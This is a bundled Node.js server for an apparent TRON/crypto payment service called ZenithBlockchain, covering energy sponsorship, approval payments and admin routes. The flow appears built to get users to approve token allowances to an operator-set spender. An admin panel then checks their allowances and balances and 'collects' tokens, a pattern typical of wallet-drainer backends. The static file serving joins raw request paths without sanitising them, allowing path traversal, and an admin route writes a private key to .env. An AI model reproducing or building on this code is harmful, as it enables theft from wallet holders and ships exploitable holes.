    memPayments.forEach((p) => netMap.set(p.network, (netMap.get(p.network) || 0) + 1));
    stats.networkDistribution = Array.from(netMap.entries()).map(([network, count]) => ({ network, count }));
    stats.recentTransactions = memPayments.slice(-10).reverse();
  }
  jsonResponse(res, stats);
};
var adminTransactionsHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const url = new URL(req.url ?? "", "http://localhost");
  const page = parseInt(url.searchParams.get("page") || "1", 10);
  const limit = parseInt(url.searchParams.get("limit") || "20", 10);
  const network = url.searchParams.get("network") || void 0;
  const status = url.searchParams.get("status") || void 0;
  const search = url.searchParams.get("search") || void 0;
  if (isPgAvailable()) {
    const result = await getTransactions({
      limit,
      offset: (page - 1) * limit,
      network,
      status,
      search
    });
    jsonResponse(res, {
      transactions: result.rows,
      total: result.total,
      page,
      totalPages: Math.ceil(result.total / limit) || 1
    });
  } else {
    let memPayments = getAllPayments();
    if (network && network !== "all") memPayments = memPayments.filter((p) => p.network === network);
    if (status && status !== "all") memPayments = memPayments.filter((p) => p.status === status);
    if (search) {
      const s = search.toLowerCase();
      memPayments = memPayments.filter(
        (p) => p.walletA?.toLowerCase().includes(s) || p.walletB.toLowerCase().includes(s) || p.transactionId?.toLowerCase().includes(s) || p.id.toLowerCase().includes(s)
      );
    }
    const total = memPayments.length;
    const start = (page - 1) * limit;
    const paged = memPayments.reverse().slice(start, start + limit);
    jsonResponse(res, {
      transactions: paged,
      total,
      page,
      totalPages: Math.ceil(total / limit) || 1
    });
  }
};
var adminWalletsHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const url = new URL(req.url ?? "", "http://localhost");
  const page = parseInt(url.searchParams.get("page") || "1", 10);
  const limit = parseInt(url.searchParams.get("limit") || "50", 10);
  const sessions2 = await getWalletSessions(limit, (page - 1) * limit);
  const total = await getWalletSessionCount();
  jsonResponse(res, {
    sessions: sessions2,
    total,
    page,
    totalPages: Math.ceil(total / limit) || 1
  });
};
var adminCollectHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const body = await readBody(req);
  const { paymentId, amount } = body;
  if (!paymentId || !amount) {
    return errorResponse(res, "Missing paymentId or amount");
  }
  const result = await collectTokens(paymentId, amount);
  jsonResponse(res, result, result.success ? 200 : 400);
};
var adminPgStatusHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  jsonResponse(res, { connected: isPgAvailable() });
};
var adminAllowanceHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const url = new URL(req.url ?? "", "http://localhost");
  const address = url.searchParams.get("address") || "";
  const contract = url.searchParams.get("contract") || void 0;
  if (!address) {
    return errorResponse(res, "Missing address parameter");
  }
  const result = await checkTronAllowanceAndBalance(address, contract);
  jsonResponse(res, result);
};
var TRON_CONFIG_KEYS = [
  "VITE_SPENDER_ADDRESS_TRON",
  "ADMIN_TRON_PRIVATE_KEY"
];
var ENV_FILE_PATH = path3.resolve(process.cwd(), ".env");
function readEnvFile() {
  try {
    const raw = fs3.readFileSync(ENV_FILE_PATH, "utf-8");
    const result = {};
    for (const line of raw.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) continue;
      const eqIdx = trimmed.indexOf("=");
      if (eqIdx === -1) continue;
      const key = trimmed.slice(0, eqIdx).trim();
      const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, "");
      result[key] = val;
    }
    return result;
  } catch {
    return {};
  }
}
function writeEnvFile(updates) {
  let raw = "";
  try {
    raw = fs3.readFileSync(ENV_FILE_PATH, "utf-8");
  } catch {
    raw = "";
  }
  const lines = raw.split("\n");
  const handled = /* @__PURE__ */ new Set();
  const updatedLines = lines.map((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) return line;
    const eqIdx = trimmed.indexOf("=");
    if (eqIdx === -1) return line;
    const key = trimmed.slice(0, eqIdx).trim();
    if (key in updates) {
      handled.add(key);
      return `${key}=${updates[key]}`;
    }
    return line;
  });
  for (const [key, val] of Object.entries(updates)) {
    if (!handled.has(key)) {
      updatedLines.push(`${key}=${val}`);
    }
  }
  fs3.writeFileSync(ENV_FILE_PATH, updatedLines.join("\n"), "utf-8");
}
function maskPrivateKey(val) {
  if (!val || val.length < 8) return val ? "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022" : "";
  return "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022" + val.slice(-6);
}
var adminConfigGetHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const env = readEnvFile();
  const data = {};
  for (const key of TRON_CONFIG_KEYS) {
    const val = process.env[key] || env[key] || "";
    if (key === "ADMIN_TRON_PRIVATE_KEY") {
      data[key] = maskPrivateKey(val);
      data["ADMIN_TRON_PRIVATE_KEY_SET"] = val.length > 0;
    } else {
      data[key] = val;
    }
  }
  jsonResponse(res, data);
};
var adminConfigPostHandler = async (req, res) => {
  if (!requireAuth(req, res)) return;
  const body = await readBody(req);
  const errors = [];
  const updates = {};
  for (const key of TRON_CONFIG_KEYS) {
    if (!(key in body)) continue;
    const raw = body[key]?.trim() ?? "";
    if (key === "ADMIN_TRON_PRIVATE_KEY") {
      if (raw === "" || raw.includes("\u2022")) {
        continue;
      }
      const hexKey = raw.startsWith("0x") ? raw.slice(2) : raw;
      if (!/^[0-9a-fA-F]{64}$/.test(hexKey)) {
        errors.push("ADMIN_TRON_PRIVATE_KEY must be a 64-character hex string (32 bytes).");
        continue;
      }
      updates[key] = hexKey;
      continue;
    }
    if (key === "VITE_SPENDER_ADDRESS_TRON") {
      if (raw !== "" && (!/^T/.test(raw) || raw.length < 33 || raw.length > 36)) {
        errors.push(`${key}: must be a valid TRON address starting with T (or leave empty).`);
        continue;
      }
      updates[key] = raw;
      continue;
    }
    updates[key] = raw;
  }
  if (errors.length > 0) {
    return errorResponse(res, errors.join(" "), 400);
  }
  if (Object.keys(updates).length === 0) {
    return jsonResponse(res, { success: true, message: "No changes detected." });
  }
  try {
    writeEnvFile(updates);
  } catch (err) {
    return errorResponse(res, `Failed to write .env: ${err.message}`, 500);
  }
  for (const [key, val] of Object.entries(updates)) {
    process.env[key] = val;
  }
  jsonResponse(res, { success: true, updated: Object.keys(updates) });
};
var prepareSponsorshipHandler = async (req, res) => {
  const body = await readBody(req);
  const userAddress = body.userAddress?.trim();
  if (!userAddress) {
    return errorResponse(res, "Missing required field: userAddress", 400);
  }
  try {
    const energyEst = await estimateApproveEnergy(userAddress);
    const requiredEnergy = Number(body.targetEnergy) || energyEst.requiredEnergy;
    const resourceInfo = await checkAccountResources(userAddress);
    if (resourceInfo.availableEnergy >= requiredEnergy) {
      const sponsorshipId = `SELF-${Date.now()}`;
      return jsonResponse(res, {
        sponsorshipId,
        userAddress: resourceInfo.address,
        status: "ENERGY_READY",
        estimatedEnergy: energyEst.estimatedEnergy,
        safetyMarginEnergy: energyEst.safetyMarginEnergy,
        requiredEnergy,
        availableEnergy: resourceInfo.availableEnergy,
        sponsored: false,
        message: "Account has sufficient existing Energy quota"
      });
    }
    const result = await delegateEnergyToUser(userAddress, requiredEnergy);
    jsonResponse(res, {
      sponsorshipId: result.sponsorshipId,
      userAddress: result.userAddress,
      sponsorAddress: result.sponsorAddress,
      status: "DELEGATING",
      estimatedEnergy: energyEst.estimatedEnergy,
      safetyMarginEnergy: energyEst.safetyMarginEnergy,
      requiredEnergy: result.requiredEnergy,
      stakedSunAmount: result.stakedSunAmount.toString(),
      delegationTxId: result.delegationTxId,
      simulated: result.simulated,
      sponsored: true
    });
  } catch (err) {
    console.error("[prepareSponsorshipHandler] Error:", err);
    errorResponse(res, `Failed to prepare Energy sponsorship: ${err?.message || err}`, 500);
  }
};
var checkEnergyHandler = async (req, res) => {
  const body = await readBody(req);
  const userAddress = body.userAddress?.trim();
  const sponsorshipId = body.sponsorshipId?.trim();
  if (!userAddress) {
    return errorResponse(res, "Missing userAddress", 400);
  }
  try {
    const simMode = isSponsorSimulationMode();
    const resourceInfo = await checkAccountResources(userAddress);
    let requiredEnergy;
    let estimatedEnergy;
    let safetyMarginEnergy;
    if (sponsorshipId) {
      const record = await getEnergySponsorship(sponsorshipId);
      if (record?.required_energy && record.required_energy > 0) {
        requiredEnergy = record.required_energy;
        estimatedEnergy = Math.round(requiredEnergy / 1.05);
        safetyMarginEnergy = requiredEnergy - estimatedEnergy;
      }
    }
    if (!requiredEnergy || requiredEnergy <= 0) {
      const est = await estimateApproveEnergy(userAddress);
      requiredEnergy = est.requiredEnergy;
      estimatedEnergy = est.estimatedEnergy;
      safetyMarginEnergy = est.safetyMarginEnergy;
    }
    const hasValidRequirement = typeof requiredEnergy === "number" && Number.isFinite(requiredEnergy) && requiredEnergy > 0;
    const isReady = hasValidRequirement && (simMode ? true : resourceInfo.availableEnergy >= requiredEnergy);
    const currentStatus = isReady ? "ENERGY_READY" : "DELEGATING";
    if (sponsorshipId && isReady) {
      await updateEnergySponsorshipStatus(sponsorshipId, "ENERGY_READY").catch(() => {
      });
    }
    jsonResponse(res, {
      sponsorshipId,
      userAddress: resourceInfo.address,
      status: currentStatus,
      isReady,
      estimatedEnergy,
      safetyMarginEnergy,
      requiredEnergy,
      availableEnergy: isReady && simMode ? requiredEnergy : resourceInfo.availableEnergy,
      energyLimit: resourceInfo.energyLimit,
      bandwidthAvailable: resourceInfo.availableBandwidth,
      simulated: simMode
    });
  } catch (err) {
    errorResponse(res, `Failed to check energy: ${err?.message || err}`, 500);
  }
};
var cancelSponsorshipHandler = async (req, res) => {
  const body = await readBody(req);
  const sponsorshipId = body.sponsorshipId?.trim();
  const reason = body.reason?.trim() || "USER_CANCELLED";
  if (!sponsorshipId) {
    return errorResponse(res, "Missing sponsorshipId", 400);
  }
  try {
    const record = await getEnergySponsorship(sponsorshipId);
    if (!record) {
      return jsonResponse(res, { cancelled: true, message: "No sponsorship found" });
    }
    await updateEnergySponsorshipStatus(sponsorshipId, "RECLAIM_PENDING", { failureReason: reason });
    await undelegateEnergyFromUser(sponsorshipId, record.user_address, record.staked_sun_amount);
    jsonResponse(res, {
      sponsorshipId,
      status: "RECLAIMED",
      cancelled: true,
      reason
    });
  } catch (err) {
    errorResponse(res, `Cancellation error: ${err?.message || err}`, 500);
  }
};
var updateSponsorshipStatusHandler = async (req, res) => {
  const body = await readBody(req);
  const sponsorshipId = body.sponsorshipId?.trim();
  const status = body.status?.trim();
  const txId = body.txId?.trim();
  const reason = body.reason?.trim();
  if (!sponsorshipId || !status) {
    return errorResponse(res, "Missing required fields: sponsorshipId, status", 400);
  }
  try {
    const opts = {};
    if (txId) opts.approvalTxId = txId;
    if (reason) opts.failureReason = reason;
    await updateEnergySponsorshipStatus(sponsorshipId, status, opts);
    jsonResponse(res, { success: true, sponsorshipId, status });
  } catch (err) {
    errorResponse(res, `Failed to update status: ${err?.message || err}`, 500);
  }
};
var triggerSmartContractProxyHandler = async (req, res) => {
  const body = await readBody(req);
  const { owner_address, contract_address, function_selector, parameter, fee_limit } = body;
  if (!owner_address || !contract_address || !function_selector || !parameter) {
    return errorResponse(res, "Missing required trigger parameters", 400);
  }
  const useMainnet = process.env.VITE_USE_MAINNET === "true";
  const nodes = useMainnet ? ["https://api.trongrid.io", "https://api.tronstack.io"] : ["https://nile.trongrid.io"];
  const headers = { "Content-Type": "application/json" };
  const apiKey = (process.env.TRONGRID_API_KEY || process.env.VITE_TRONGRID_API_KEY)?.trim();
  if (apiKey) {
    headers["TRON-PRO-API-KEY"] = apiKey;
  }
  let lastError = "";
  for (const node of nodes) {
    try {
      const resp = await fetch(`${node}/wallet/triggersmartcontract`, {
        method: "POST",
        headers,
        body: JSON.stringify({
          owner_address,
          contract_address,
          function_selector,
          parameter,
          fee_limit: fee_limit || 1e8,
          call_value: 0,
          visible: false
        })
      });
      if (resp.ok) {
        const data = await resp.json();
        if (data?.result?.result && data.transaction) {
          return jsonResponse(res, { success: true, transaction: data.transaction });
        }
        lastError = JSON.stringify(data?.result || "Contract execution simulated failure");
      } else {
        lastError = `Node ${node} returned HTTP ${resp.status}: ${resp.statusText}`;
      }
    } catch (err) {
      lastError = err?.message || String(err);
    }
  }
  return errorResponse(res, `All TRON nodes failed to trigger smart contract: ${lastError}`, 502);
};
var confirmApprovalHandler = async (req, res) => {
  const body = await readBody(req);
  const txId = body.txId?.trim();
  const userAddress = body.userAddress?.trim();
  const sponsorshipId = body.sponsorshipId?.trim();
  const paymentId = body.paymentId?.trim();
  if (!txId || !userAddress || !paymentId) {
    return errorResponse(res, "Missing required fields: paymentId, txId, userAddress", 400);
  }
  try {
    const payment = getPayment(paymentId);
    const storedTransaction = await getTransactionById(paymentId);
    const stored = payment ?? storedTransaction;
    if (!stored || stored.network !== "tron") {
      return errorResponse(res, "Approval payment record not found", 404);
    }
    const storedUser = payment?.walletA ?? storedTransaction?.wallet_a;
    if (!storedUser || storedUser !== userAddress) {
      return errorResponse(res, "Approval owner does not match the payment record", 400);
    }
    const { amountStr, baseUnits } = getConfiguredApprovalAmount();
    const storedAmount = payment?.amount ?? storedTransaction?.amount;
    if (storedAmount !== amountStr) {
      return errorResponse(res, "Approval amount does not match the configured platform fee", 409);
    }
    const spenderAddress = process.env.VITE_SPENDER_ADDRESS_TRON || "";
    if (!spenderAddress) return errorResponse(res, "TRON spender address is not configured", 500);
    const verResult = await verifyOnChainApprovalTransaction(
      txId,
      userAddress,
      spenderAddress,
      baseUnits,
      getConfiguredTronNetwork()
    );
    if (!verResult.verified) {
      return jsonResponse(res, {
        confirmed: false,
        pending: verResult.error?.includes("pending") || verResult.error?.includes("not found"),
        error: verResult.error
      });
    }
    updatePayment(paymentId, { status: "CONFIRMED", transactionId: txId });
    await updateTransactionStatus(paymentId, "CONFIRMED", txId, verResult.blockNumber);
    if (sponsorshipId) {
      await updateEnergySponsorshipStatus(sponsorshipId, "CONFIRMED", { approvalTxId: txId });
    }
    if (sponsorshipId) {
      const spRecord = await getEnergySponsorship(sponsorshipId);
      if (spRecord) {
        undelegateEnergyFromUser(sponsorshipId, spRecord.user_address, spRecord.staked_sun_amount).catch((uErr) => console.warn("[confirmApproval] Post-confirm undelegation error:", uErr));
      }
    }
    jsonResponse(res, {
      confirmed: true,
      blockNumber: verResult.blockNumber,
      energyUsed: verResult.energyUsed,
      txId,
      configuredAmount: amountStr,
      configuredBaseUnits: baseUnits.toString(),
      status: "CONFIRMED"
    });
  } catch (err) {
    console.error("[confirmApprovalHandler] Error:", err);
    errorResponse(res, `Failed to confirm approval: ${err?.message || err}`, 500);
  }
};
var sponsorshipStatusHandler = async (req, res) => {
  const parsedUrl = new URL(req.url || "", "http://localhost");
  const sponsorshipId = parsedUrl.searchParams.get("sponsorshipId");
  const userAddress = parsedUrl.searchParams.get("userAddress");
  try {
    let sponsorship = null;
    if (sponsorshipId) {
      sponsorship = await getEnergySponsorship(sponsorshipId);
    } else if (userAddress) {
      sponsorship = await getActiveSponsorshipForUser(userAddress);
    }
    const poolStatus = await getSponsorPoolStatus();
    jsonResponse(res, { sponsorship, poolStatus });
  } catch (err) {
    errorResponse(res, `Failed to get sponsorship status: ${err?.message || err}`, 500);
  }
};
var reconcileInterval = setInterval(() => {
  reconcilePendingReclamations().catch(
    (err) => console.error("[ReconciliationWorker] Error in periodic run:", err)
  );
}, 6e4);
if (typeof reconcileInterval === "object" && "unref" in reconcileInterval) {
  reconcileInterval.unref();
}
function handlePaymentRoute(req, res) {
  const url = req.url ?? "";
  const method = req.method ?? "GET";
  if (method === "POST" && url === "/api/wallet-session") {
    walletSessionHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  if (url.startsWith("/api/tron/")) {
    if (method === "POST" && url === "/api/tron/prepare-sponsorship") {
      prepareSponsorshipHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/tron/check-energy") {
      checkEnergyHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/tron/cancel-sponsorship") {
      cancelSponsorshipHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/tron/update-sponsorship-status") {
      updateSponsorshipStatusHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/tron/trigger-smart-contract") {
      triggerSmartContractProxyHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/tron/sponsorship-status")) {
      sponsorshipStatusHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
  }
  if (url.startsWith("/api/admin")) {
    if (method === "POST" && url === "/api/admin/login") {
      adminLoginHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/admin/logout") {
      adminLogoutHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/overview")) {
      adminOverviewHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/transactions")) {
      adminTransactionsHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/wallets")) {
      adminWalletsHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/admin/collect") {
      adminCollectHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/allowance")) {
      adminAllowanceHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/pg-status")) {
      adminPgStatusHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "GET" && url.startsWith("/api/admin/config")) {
      adminConfigGetHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    if (method === "POST" && url === "/api/admin/config") {
      adminConfigPostHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
      return true;
    }
    errorResponse(res, "Admin route not found", 404);
    return true;
  }
  if (!url.startsWith("/api/payment")) return false;
  if (method === "POST" && url === "/api/payment/create") {
    createPaymentHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  if (method === "POST" && url === "/api/payment/record-approval") {
    recordApprovalHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  if (method === "POST" && url === "/api/payment/confirm-approval") {
    confirmApprovalHandler(req, res, {}).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  const btcUriMatch = url.match(/^\/api\/payment\/bitcoin\/([^/]+)\/uri$/);
  if (method === "GET" && btcUriMatch) {
    bitcoinUriHandler(req, res, { id: btcUriMatch[1] }).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  const idMatch = url.match(/^\/api\/payment\/([^/]+)$/);
  if (method === "GET" && idMatch) {
    getPaymentHandler(req, res, { id: idMatch[1] }).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  const connectedMatch = url.match(/^\/api\/payment\/([^/]+)\/connected$/);
  if (method === "POST" && connectedMatch) {
    connectedHandler(req, res, { id: connectedMatch[1] }).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  const signedMatch = url.match(/^\/api\/payment\/([^/]+)\/signed$/);
  if (method === "POST" && signedMatch) {
    signedHandler(req, res, { id: signedMatch[1] }).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  const verifyMatch = url.match(/^\/api\/payment\/([^/]+)\/verify$/);
  if (method === "GET" && verifyMatch) {
    verifyHandler(req, res, { id: verifyMatch[1] }).catch(() => errorResponse(res, "Internal error", 500));
    return true;
  }
  return false;
}

// server/index.ts
var __dirname2 = path4.dirname(fileURLToPath2(import.meta.url));
var ROOT2 = path4.resolve(__dirname2, "..");
function loadDotEnv2(filePath) {
  if (!fs4.existsSync(filePath)) return;
  const lines = fs4.readFileSync(filePath, "utf8").split("\n");
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const eqIdx = trimmed.indexOf("=");
    if (eqIdx === -1) continue;
    const key = trimmed.slice(0, eqIdx).trim();
    const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, "");
    if (key && !(key in process.env)) {
      process.env[key] = val;
    }
  }
}
loadDotEnv2(path4.join(ROOT2, ".env"));
loadDotEnv2(path4.join(ROOT2, ".env.production"));
getPool();
var rawPort = process.env.PORT;
var PORT = rawPort && !isNaN(Number(rawPort)) ? parseInt(rawPort, 10) : rawPort || 3e3;
var DIST_DIR = path4.join(ROOT2, "dist");
var INDEX_HTML = path4.join(DIST_DIR, "index.html");
var MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".mjs": "application/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".ico": "image/x-icon",
  ".webp": "image/webp",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".json": "application/json",
  ".txt": "text/plain"
};
function getMime(filePath) {
  const ext = path4.extname(filePath).toLowerCase();
  return MIME[ext] ?? "application/octet-stream";
}
function serveFile(res, filePath, statusCode = 200) {
  try {
    const content = fs4.readFileSync(filePath);
    const mime = getMime(filePath);
    res.writeHead(statusCode, {
      "Content-Type": mime,
      "Content-Length": content.length,
      // Cache hashed assets aggressively; HTML never
      "Cache-Control": filePath.includes("/assets/") ? "public, max-age=31536000, immutable" : "no-cache"
    });
    res.end(content);
  } catch {
    res.writeHead(404, { "Content-Type": "text/plain" });
    res.end("404 Not Found");
  }
}
var server = createServer((req, res) => {
  const url = req.url ?? "/";
  if (url === "/health" || url === "/ping") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ status: "ok", ts: Date.now() }));
    return;
  }
  if (url.startsWith("/api/")) {
    const handled = handlePaymentRoute(req, res);
    if (!handled) {
      res.writeHead(404, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ error: "API route not found" }));
    }
    return;
  }
  if (url.startsWith("/assets/") || url === "/favicon.svg" || url === "/icons.svg") {
    const filePath = path4.join(DIST_DIR, url.split("?")[0]);
    if (fs4.existsSync(filePath) && fs4.statSync(filePath).isFile()) {
      serveFile(res, filePath);
      return;
    }
  }
  const staticPath = path4.join(DIST_DIR, url.split("?")[0]);
  if (fs4.existsSync(staticPath) && fs4.statSync(staticPath).isFile()) {
    serveFile(res, staticPath);
    return;
  }
  if (fs4.existsSync(INDEX_HTML)) {
    serveFile(res, INDEX_HTML);
  } else {
    res.writeHead(503, { "Content-Type": "text/plain" });
    res.end("App not built yet. Run: npm run build");
  }
});
if (typeof globalThis.PhusionPassenger !== "undefined") {
  globalThis.PhusionPassenger.configure({ autoInstall: false });
}
if (typeof globalThis.PhusionPassenger !== "undefined") {
  server.listen("passenger", () => {
    console.log("\u{1F680} Running under Phusion Passenger");
    console.log(`   Dist dir : ${DIST_DIR}`);
  });
} else if (process.env.PORT) {
  const listenTarget = !isNaN(Number(process.env.PORT)) ? parseInt(process.env.PORT, 10) : process.env.PORT;
  server.listen(listenTarget, () => {
    console.log(`\u{1F680} Server listening on ${listenTarget}`);
    console.log(`   Dist dir : ${DIST_DIR}`);
  });
} else {
  const srv = server.listen(3e3, () => {
    console.log("\n\u{1F680} ZenithBlockchain server running on port 3000");
    console.log(`   Dist dir : ${DIST_DIR}`);
  });
  srv.on("error", (err) => {
    if (err.code === "EADDRINUSE") {
      console.warn("\u26A0\uFE0F Port 3000 is in use by another process. Binding to any available port...");
      server.listen(0, () => {
        const addr = server.address();
        const p = typeof addr === "object" && addr ? addr.port : addr;
        console.log(`\u{1F680} ZenithBlockchain server running on port ${p}`);
      });
    } else {
      throw err;
    }
  });
}
process.on("SIGTERM", () => {
  console.log("SIGTERM received \u2014 shutting down gracefully");
  server.close(() => process.exit(0));
});
process.on("SIGINT", () => {
  console.log("SIGINT received \u2014 shutting down gracefully");
  server.close(() => process.exit(0));
});
